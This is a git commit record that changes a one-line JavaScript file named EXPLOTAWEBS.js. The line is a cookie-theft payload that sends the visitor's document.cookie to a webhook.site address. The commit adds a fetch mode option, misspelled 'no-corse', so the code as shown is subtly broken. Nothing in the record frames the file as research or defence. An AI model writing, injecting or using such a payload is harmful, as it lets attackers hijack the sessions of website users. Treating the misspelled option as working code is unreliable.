4a8b90be23c9cb331bb83ed4a8b1774929478ac4
Tian3030 <146120601+Tian3030@users.noreply.github.com>
2025-10-30 18:23:51 +0100

    Update EXPLOTAWEBS.js

--- EXPLOTAWEBS.js
+++ EXPLOTAWEBS.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/6086c30b-33eb-4594-9623-4ca893008296?c=' + document.cookie)  
+fetch('https://webhook.site/6086c30b-33eb-4594-9623-4ca893008296?c=' + document.cookie,{mode:"no-corse"})  
